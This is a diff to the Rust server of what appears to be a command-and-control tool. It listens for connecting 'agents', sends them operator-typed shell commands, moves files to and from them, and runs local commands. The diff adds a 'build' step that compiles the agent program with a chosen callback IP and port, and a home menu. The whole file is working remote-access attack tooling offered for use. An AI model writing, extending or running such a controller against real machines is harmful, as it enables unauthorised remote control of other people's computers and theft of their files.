@@ -3,6 +3,7 @@ use std::io::{self, Write, BufReader, BufRead};
 use std::net::Ipv4Addr;
 use std::mem::drop;
 use std::net::{Shutdown, SocketAddrV4, TcpListener, TcpStream};
+use std::env;
 
 fn handle_connection(clientsocket: &mut TcpStream, clients: &Arc<Mutex<HashMap<String, TcpStream>>>, port2: &String) {
     println!("New client connected: {}", clientsocket.local_addr().unwrap());
@@ -10,7 +11,6 @@ fn handle_connection(clientsocket: &mut TcpStream, clients: &Arc<Mutex<HashMap<S
     let client_list = clients.lock().unwrap().keys().cloned().collect::<Vec<String>>();
     let num_clients = client_list.len();
     println!(" 
-
         _______________________________________________________________       
         Active:   Server: {} <- Client: {}      
         _______________________________________________________________
@@ -25,7 +25,7 @@ fn handle_connection(clientsocket: &mut TcpStream, clients: &Arc<Mutex<HashMap<S
         println!("Enter Command to send Agent-{} : ",clientaddr);
         let mut msg = String::new();
         io::stdin().read_line(&mut msg).expect("String expected");
-        if msg.trim()==String::from("dl"){
+        if msg.trim().contains("dl"){
             msg.push('\0');
             let mut buffer: Vec<u8> = Vec::new();
             clientsocket.write(msg.as_bytes());
@@ -43,6 +43,7 @@ fn handle_connection(clientsocket: &mut TcpStream, clients: &Arc<Mutex<HashMap<S
             msg.push('\0');
             let mut buffer: Vec<u8> = Vec::new();
             clientsocket.write(msg.as_bytes());
+            println!("Sent flnm{}", &msg);
             let mut reader = BufReader::new(clientsocket.try_clone().unwrap());
             println!("client {} sent \n{}", clientaddr, String::from_utf8_lossy(&buffer));
         } else if msg.trim()==String::from("tx"){ //send files to client
@@ -71,16 +72,7 @@ fn handle_connection(clientsocket: &mut TcpStream, clients: &Arc<Mutex<HashMap<S
             println!("Sent flnm: {}", &msgfn);
             let mut reader = BufReader::new(clientsocket.try_clone().unwrap());
             handle_client_rx(clientsocket);
-        } else if msg.trim()==String::from("agents"){
-            if let Some(last_client) = client_list.last() {
-                println!("The current active Agent is: {}", last_client);
-            } else {
-                println!("No clients connected");
-            }
-            println!("We have {} Active agents", num_clients);
-            println!("With ID's: {:?}\n", client_list);
-            continue;
-        } else if msg.trim()==String::from("local"){ //send commands to local server OS
+        }  else if msg.trim()==String::from("local"){ //send commands to local server OS
             msg.push('\0');
             println!("Enter name of Command to send locally: ");
             let mut msg = String::new();
@@ -88,6 +80,87 @@ fn handle_connection(clientsocket: &mut TcpStream, clients: &Arc<Mutex<HashMap<S
             let mut output =executecmd(String::from(&msg).trim_end_matches('\0'));
             output.push('\0');
             println!("Local Returns \n{}", &output);
+            continue;
+        } else if msg.trim()==String::from("build"){ //send commands to local server OS
+            msg.push('\0');
+            println!("Enter the IP address that your agent should connect to (Ex: 192.168.1.1) : ");
+            let mut msgip = String::new();
+            io::stdin().read_line(&mut msgip).expect("String expected");
+            let mut cmd_env_var_ip = format!("set AGENT_IP=\"{}\"", msgip.trim().to_string());
+            println!("{}",cmd_env_var_ip);
+            let mut pwrsh_env_var_ip = format!("Set-Item -Path Env:AGENT_IP -Value \"{}\"", msgip.trim().to_string());
+            println!("{}",pwrsh_env_var_ip);
+            let mut lnx_env_var_ip = format!("export AGENT_IP=\"{}\"", msgip.trim().to_string());
+            println!("{}",pwrsh_env_var_ip);
+            println!("Enter the port number that your agent should connect to Ex: 9001 : ");
+            let mut msgport = String::new();
+            io::stdin().read_line(&mut msgport).expect("String expected");
+            let mut cmd_env_var_port = format!("set AGENT_PORT=\"{}\"", msgport.trim().to_string());
+            println!("{}",cmd_env_var_port);
+            let mut pwrsh_env_var_port = format!("Set-Item -Path Env:AGENT_PORT -Value \"{}\"", msgport.trim().to_string());
+            println!("{}",pwrsh_env_var_port);
+            let mut lnx_env_var_port = format!("export AGENT_PORT=\"{}\"", msgport.trim().to_string());
+            println!("{}",lnx_env_var_port);
+
+            if cfg!(windows){
+                let comspec = env::var("COMSPEC").unwrap_or_default();
+                if comspec.ends_with("cmd.exe") {
+                    println!("Current shell is cmd.exe");
+                        let mut output =executecmd(String::from(&cmd_env_var_ip).trim_end_matches('\0'));
+                        output.push('\0');
+                        println!("Local Returns \n{}", &output);
+                        let mut output =executecmd(String::from(&cmd_env_var_port).trim_end_matches('\0'));
+                        output.push('\0');
+                        println!("Local Returns \n{}", &output);
+                        let mut output =executecmd(String::from("cargo build --manifest-path=../client/Cargo.toml").trim_end_matches('\0'));
+                        output.push('\0');
+                        println!("Local Returns \n{}", &output);
+                } else if comspec.ends_with("powershell.exe") {
+                    println!("Current shell is powershell.exe");
+                        let mut output =executecmd(String::from(&pwrsh_env_var_ip).trim_end_matches('\0'));
+                        output.push('\0');
+                        println!("Local Returns \n{}", &output);
+                        let mut output =executecmd(String::from(&pwrsh_env_var_port).trim_end_matches('\0'));
+                        output.push('\0');
+                        println!("Local Returns \n{}", &output);
+                        let mut output =executecmd(String::from("cargo build --manifest-path=../client/Cargo.toml").trim_end_matches('\0'));
+                        output.push('\0');
+                        println!("Local Returns \n{}", &output);
+                }
+                continue;
+            } else if cfg!(unix){
+                // setting env vars for build
+                let mut output =executecmd(String::from(&lnx_env_var_ip).trim_end_matches('\0'));
+                output.push('\0');
+                println!("Local Returns \n{}", &output);
+                let mut output =executecmd(String::from(&lnx_env_var_port).trim_end_matches('\0'));
+                output.push('\0');
+                println!("Local Returns \n{}", &output);
+                let mut output =executecmd(String::from("cargo build --manifest-path=../client/Cargo.toml").trim_end_matches('\0'));
+                output.push('\0');
+                println!("Local Returns \n{}", &output);
+                continue;
+
+            } else if cfg!(target_os = "macos"){
+                let mut output =executecmd(String::from(&lnx_env_var_ip).trim_end_matches('\0'));
+                output.push('\0');
+                println!("Local Returns \n{}", &output);
+                let mut output =executecmd(String::from(&lnx_env_var_port).trim_end_matches('\0'));
+                output.push('\0');
+                println!("Local Returns \n{}", &output);
+                let mut output =executecmd(String::from("cargo build --manifest-path=../client/Cargo.toml").trim_end_matches('\0'));
+                output.push('\0');
+                println!("Local Returns \n{}", &output);
+                continue;
+            }
+        } else if (msg.trim().contains("agents")){
+            if let Some(last_client) = client_list.last() {
+                println!("The current active Agent is: {}", last_client);
+            } else {
+                println!("No clients connected");
+            }
+            println!("We have {} Active agents", num_clients);
+            println!("With ID's: {:?}\n", client_list);
             continue;
         } else {
             msg.push('\0');
@@ -106,36 +179,201 @@ fn handle_connection(clientsocket: &mut TcpStream, clients: &Arc<Mutex<HashMap<S
                 println!(" quit,                     Quits current client connection\n");
                 println!(" agents,                   Shows connected devices. Type 'quit' to switch to the next connected client\n");
                 println!(" local,                    Allows commands to send to local server OS while in shell\n");
+                println!(" build,                    Builds agent program, given server IP and port to connect to\n");
             } else if cfg!(unix) { 
                 println!("Usage: [COMMAND]           Gives result\n");
-                println!(" dl,                       Asks for source url and filename to write\n");
-                println!(" tx,                       Asks for filename to send from server in current directory\n");
-                println!(" rx,                       Asks for filename to receive from client in current directory\n");
+                println!(" dl,                       Available after connection, Asks for source url and filename to write\n");
+                println!(" tx,                       Available after connection, Asks for filename to send from server in current directory\n");
+                println!(" rx,                       Available after connection, Asks for filename to receive from client in current directory\n");
                 println!(" quit,                     Quits current client connection\n");
                 println!(" agents,                   Shows connected devices. Type 'quit' to switch to the next connected client\n");
                 println!(" local,                    Allows commands to send to local server OS while in shell\n");
+                println!(" build,                    Builds agent program, given server IP and port to connect to\n");
             } else if cfg!(target_os = "macos") {
                 println!("Usage: [COMMAND]           Gives result\n");
-                println!(" dl,                       Asks for source url and filename to write\n");
-                println!(" tx,                       Asks for filename to send from server in current directory\n");
-                println!(" rx,                       Asks for filename to receive from client in current directory\n");
+                println!(" dl,                       Available after connection, Asks for source url and filename to write\n");
+                println!(" tx,                       Available after connection, Asks for filename to send from server in current directory\n");
+                println!(" rx,                       Available after connection, Asks for filename to receive from client in current directory\n");
                 println!(" quit,                     Quits current client connection\n");
                 println!(" agents,                   Shows connected devices. Type 'quit' to switch to the next connected client\n");
                 println!(" local,                    Allows commands to send to local server OS while in shell\n");
+                println!(" build,                    Builds agent program, given server IP and port to connect to\n");
             }
         }
+
         msg.push('\0');
         let mut buffer: Vec<u8> = Vec::new();
-        if msg.trim()==String::from("quit"){
+        if msg.trim().contains("quit"){
             println!("shutting down client stream: {}", &clientaddr);
             clientsocket.shutdown(Shutdown::Both);
-            println!("end of connections, crtl + c to terminate server program: {}", clientsocket.local_addr().unwrap());
+            //println!("end of connections, crtl + c to terminate server program: {}", clientsocket.local_addr().unwrap());
             break;
         } 
-        
         let mut reader = BufReader::new(clientsocket.try_clone().unwrap());
         reader.read_until(b'\0', &mut buffer);
         println!("client {} sent \n{}", clientaddr, String::from_utf8_lossy(&buffer));
+    }
+    //v1
+    println!("end of connections, crtl + c to terminate server program: {}", clientsocket.local_addr().unwrap());
+}
+
+fn handle_local(clients: &Arc<Mutex<HashMap<String, TcpStream>>>) {
+    //println!("New client connected: {}", clientsocket.local_addr().unwrap());
+    //let clientaddr = clientsocket.peer_addr().unwrap();
+    let client_list = clients.lock().unwrap().keys().cloned().collect::<Vec<String>>();
+    let num_clients = client_list.len();
+    
+    println!(" 
+
+                    █▄─▄▄▀█▄─▄▄─█▄─▄▄▀█─▄▄─█▄─▀─▄█
+                    ██─▄─▄██─▄█▀██─██─█─██─██▀─▀██
+                    ▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▀▀▄▄▄▄▀▄▄█▄▄▀ 
+                    
+        _______________________________________________________________
+
+        Type 'rtfm' for help \n"); //,clients.keys(), clientsocket.local_addr().unwrap(),clientaddr); // {:?} inside Map
+
+    loop {
+        println!("Welcome to the home menu: ");
+        let mut msg = String::new();
+        io::stdin().read_line(&mut msg).expect("String expected");
+
+        if msg.trim()==String::from("quit"){
+            println!("Continuing to wait for connections...");
+            break;
+        }
+        if msg.trim()==String::from("rtfm"){ 
+            println!("THE MANUAL_________________________________________________________________\n");
+            if cfg!(windows) {
+                println!("Usage: [COMMAND]           Gives result\n");
+                println!(" dl,                       Available after connection, Asks for source url and filename to write\n");
+                println!(" tx,                       Available after connection, Asks for filename to send from server in current directory\n");
+                println!(" rx,                       Available after connection, Asks for filename to receive from client in current directory\n");
+                println!(" quit,                     Quits Home Menu and continues to Listener\n");
+                println!(" agents,                   Shows connected devices. Type 'quit' to switch to the next connected client\n");
+                println!(" local,                    Allows commands to send to local server OS while in shell\n");
+                println!(" build,                    Builds agent program, given server IP and port to connect to\n");
+            } else if cfg!(unix) { 
+                println!("Usage: [COMMAND]           Gives result\n");
+                println!(" dl,                       Available after connection, Asks for source url and filename to write\n");
+                println!(" tx,                       Available after connection, Asks for filename to send from server in current directory\n");
+                println!(" rx,                       Available after connection, Asks for filename to receive from client in current directory\n");
+                println!(" quit,                     Quits current client connection\n");
+                println!(" agents,                   Shows connected devices. Type 'quit' to switch to the next connected client\n");
+                println!(" local,                    Allows commands to send to local server OS while in shell\n");
+                println!(" build,                    Builds agent program, given server IP and port to connect to\n");
+            } else if cfg!(target_os = "macos") {
+                println!("Usage: [COMMAND]           Gives result\n");
+                println!(" dl,                       Available after connection, Asks for source url and filename to write\n");
+                println!(" tx,                       Available after connection, Asks for filename to send from server in current directory\n");
+                println!(" rx,                       Available after connection, Asks for filename to receive from client in current directory\n");
+                println!(" quit,                     Quits current client connection\n");
+                println!(" agents,                   Shows connected devices. Type 'quit' to switch to the next connected client\n");
+                println!(" local,                    Allows commands to send to local server OS while in shell\n");
+                println!(" build,                    Builds agent program, given server IP and port to connect to\n");
+            }
+        }
+        else if msg.trim()==String::from("local"){ //send commands to local server OS
+            msg.push('\0');
+            println!("Enter name of Command to send locally: ");
+            let mut msg = String::new();
+            io::stdin().read_line(&mut msg).expect("String expected");
+            let mut output =executecmd(String::from(&msg).trim_end_matches('\0'));
+            output.push('\0');
+            println!("Local Returns \n{}", &output);
+            continue;
+        } else if msg.trim()==String::from("build"){ //send commands to local server OS
+            msg.push('\0');
+            println!("Enter the IP address that your agent should connect to (Ex: 192.168.1.1) : ");
+            let mut msgip = String::new();
+            io::stdin().read_line(&mut msgip).expect("String expected");
+            let mut cmd_env_var_ip = format!("set AGENT_IP=\"{}\"", msgip.trim().to_string());
+            println!("{}",cmd_env_var_ip);
+            let mut pwrsh_env_var_ip = format!("Set-Item -Path Env:AGENT_IP -Value \"{}\"", msgip.trim().to_string());
+            println!("{}",pwrsh_env_var_ip);
+            let mut lnx_env_var_ip = format!("export AGENT_IP=\"{}\"", msgip.trim().to_string());
+            println!("{}",pwrsh_env_var_ip);
+            println!("Enter the port number that your agent should connect to Ex: 9001 : ");
+            let mut msgport = String::new();
+            io::stdin().read_line(&mut msgport).expect("String expected");
+            let mut cmd_env_var_port = format!("set AGENT_PORT=\"{}\"", msgport.trim().to_string());
+            println!("{}",cmd_env_var_port);
+            let mut pwrsh_env_var_port = format!("Set-Item -Path Env:AGENT_PORT -Value \"{}\"", msgport.trim().to_string());
+            println!("{}",pwrsh_env_var_port);
+            let mut lnx_env_var_port = format!("export AGENT_PORT=\"{}\"", msgport.trim().to_string());
+            println!("{}",lnx_env_var_port);
+
+            if cfg!(windows){
+                let comspec = env::var("COMSPEC").unwrap_or_default();
+                if comspec.ends_with("cmd.exe") {
+                    println!("Current shell is cmd.exe");
+                        let mut output =executecmd(String::from(&cmd_env_var_ip).trim_end_matches('\0'));
+                        output.push('\0');
+                        println!("Local Returns \n{}", &output);
+                        let mut output =executecmd(String::from(&cmd_env_var_port).trim_end_matches('\0'));
+                        output.push('\0');
+                        println!("Local Returns \n{}", &output);
+                        let mut output =executecmd(String::from("cargo build --manifest-path=../client/Cargo.toml").trim_end_matches('\0'));
+                        output.push('\0');
+                        println!("Local Returns \n{}", &output);
+
+                } else if comspec.ends_with("powershell.exe") {
+                    println!("Current shell is powershell.exe");
+                        let mut output =executecmd(String::from(&pwrsh_env_var_ip).trim_end_matches('\0'));
+                        output.push('\0');
+                        println!("Local Returns \n{}", &output);
+                        let mut output =executecmd(String::from(&pwrsh_env_var_port).trim_end_matches('\0'));
+                        output.push('\0');
+                        println!("Local Returns \n{}", &output);
+                        let mut output =executecmd(String::from("cargo build --manifest-path=../client/Cargo.toml").trim_end_matches('\0'));
+                        output.push('\0');
+                        println!("Local Returns \n{}", &output);
+
+                }
+                continue;
+            } else if cfg!(unix){
+                let mut output =executecmd(String::from(&lnx_env_var_ip).trim_end_matches('\0'));
+                output.push('\0');
+                println!("Local Returns \n{}", &output);
+                let mut output =executecmd(String::from(&lnx_env_var_port).trim_end_matches('\0'));
+                output.push('\0');
+                println!("Local Returns \n{}", &output);
+                let mut output =executecmd(String::from("cargo build --manifest-path=../client/Cargo.toml").trim_end_matches('\0'));
+                output.push('\0');
+                println!("Local Returns \n{}", &output);
+                continue;
+
+            } else if cfg!(target_os = "macos"){
+                let mut output =executecmd(String::from(&lnx_env_var_ip).trim_end_matches('\0'));
+                output.push('\0');
+                println!("Local Returns \n{}", &output);
+                let mut output =executecmd(String::from(&lnx_env_var_port).trim_end_matches('\0'));
+                output.push('\0');
+                println!("Local Returns \n{}", &output);
+                let mut output =executecmd(String::from("cargo build --manifest-path=../client/Cargo.toml").trim_end_matches('\0'));
+                output.push('\0');
+                println!("Local Returns \n{}", &output);
+                continue;
+            }
+        } else if (msg.trim().contains("agents")){
+            if let Some(last_client) = client_list.last() {
+                println!("The current active Agent is: {}", last_client);
+            } else {
+                println!("No clients connected");
+            }
+            println!("We have {} Active agents", num_clients);
+            println!("With ID's: {:?}\n", client_list);
+            continue;
+        }
+        else {
+            msg.push('\0');
+            let mut buffer: Vec<u8> = Vec::new();
+            println!("Sent {}", &msg);
+        }
+        if msg.trim()==String::from("quit"){
+            println!("Going to connections");
+            break;
+        } 
     }
 }
 
@@ -269,7 +507,6 @@ fn executecmd(cmd: &str) -> String {
     let mut change_dir: bool = false;
     let mut cmd_parts_temp: Vec<&str> = ["",""].to_vec();
     if extra_args {
-        //change so that we dont split for unix as then strip \r off
         if cfg!(unix){
             //adding fix for linux cleaning to last entry
             let last_length = cmd_parts.len()-1;
@@ -280,7 +517,6 @@ fn executecmd(cmd: &str) -> String {
         else {
             cmd_parts = cmd.split(" ").collect();
         }
-        //println!("change_dir2 is: {} value is: {}", change_dir, cmd_parts[0]);
         change_dir = if extra_args {
             cmd_parts[0] == "cd"
         } else {
@@ -289,20 +525,16 @@ fn executecmd(cmd: &str) -> String {
 
         cmd_parts_temp = cmd.split(" ").collect();
         if cfg!(unix){
-            //let mut cmd_parts_temp: Vec<&str> = cmd.split(" ").collect();
             change_dir = if extra_args {
                 cmd_parts_temp[0] == "cd"
             } else {
                 false
             };
         }
-        //println!("cmd_parts after split is: {:?}", cmd_parts);
-        //println!("change_dir3 is: {} value is: {}", change_dir, cmd_parts[1]);
         cmd_parts.insert(0, client_os.1);
         if let Some(last_cmd) = cmd_parts.last_mut() {
             *last_cmd = last_cmd.trim_end_matches("\r\n");
         }   
-        //println!("cmd_parts is: {:?}",cmd_parts);
     }
     else {
         cmd_parts = cmd.split("\r").collect();
@@ -350,7 +582,7 @@ use std::sync::{Arc, Mutex};
 async fn main() { 
     // set ip address and port here
     let mut ipaddy = "0.0.0.0".to_string();
-    let port = 5359;
+    let port = 9001;
     let port2 = "9001".to_string(); // for tx and rx of files
     
     let serveraddress = format!("{}:{}",ipaddy,port);
@@ -369,50 +601,42 @@ async fn main() {
         }
         Err(e) => {println!("{}",e); exit(0);}
     };
+
     let listener = TcpListener::bind(serveraddress.to_string()).unwrap();
     let clients: Arc<Mutex<HashMap<String, TcpStream>>> = Arc::new(Mutex::new(HashMap::new()));
-
-    println!(" 
-
-                    █▄─▄▄▀█▄─▄▄─█▄─▄▄▀█─▄▄─█▄─▀─▄█
-                    ██─▄─▄██─▄█▀██─██─█─██─██▀─▀██
-                    ▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▀▀▄▄▄▄▀▄▄█▄▄▀ 
-                    
-                    ");
+    let mut clients_clone = clients.clone();
 
     println!("Waiting for connections...");
 
-    // v2 using multi threading
-    for stream in listener.incoming() {
-        match stream {
-            Ok(mut stream) => {
-                let clients_clone = clients.clone();
+    handle_local(&clients_clone);
+
+    // v1
+    for mut con in listener.incoming(){
+        match con {
+            Ok(mut stream) =>{
+                clients_clone = clients.clone();
                 let port2clone = port2.clone();
                 let client_id = stream.peer_addr().unwrap().to_string();
-                 // Add the new client to the hashmap
-                 clients_clone.lock().unwrap().insert(client_id.clone(), stream.try_clone().unwrap());
-                 // Print the list of connected clients
-                 let client_list = clients_clone.lock().unwrap()
-                 .keys()
-                 .map(|s| s.as_ref())
-                 .collect::<Vec<&str>>()
-                 .iter()
-                 .map(|s| s.to_string())
-                 .collect::<Vec<String>>();
-                // Spawn a new thread to handle incoming connections
-                thread::spawn(move|| {
-                    // connection succeeded
-                    handle_connection(&mut stream, &clients_clone, &port2clone);
-                    // Remove the client from the hashmap when the connection is closed
-                    clients_clone.lock().unwrap().remove(&client_id);
-                    // Print the updated list of connected clients
-                    let client_list = clients_clone.lock().unwrap().keys().cloned().collect::<Vec<String>>();
-                    println!("Connected clients: {:?}", client_list);
-                });
+                clients_clone.lock().unwrap().insert(client_id.clone(), stream.try_clone().unwrap());
+                let client_list = clients_clone.lock().unwrap()
+                .keys()
+                .map(|s| s.as_ref())
+                .collect::<Vec<&str>>()
+                .iter()
+                .map(|s| s.to_string())
+                .collect::<Vec<String>>();
+            println!("Client list is: {:?}\n Connected clients are: {:?}", clients_clone, client_list);
+                handle_connection(&mut stream, &clients_clone, &port2clone);
+                clients_clone.lock().unwrap().remove(&client_id);
+                let client_list = clients_clone.lock().unwrap().keys().cloned().collect::<Vec<String>>().iter()
+                .map(|s| s.to_string())
+                .collect::<Vec<String>>();
+                println!("Connected clients: {:?}", client_list);
             }
-            Err(e) => { /* connection failed */ }
+            Err(e) => println!("{}", e),
         }
-    } 
+    }
     println!("Stopping server listener");
     drop(listener);
 }
+
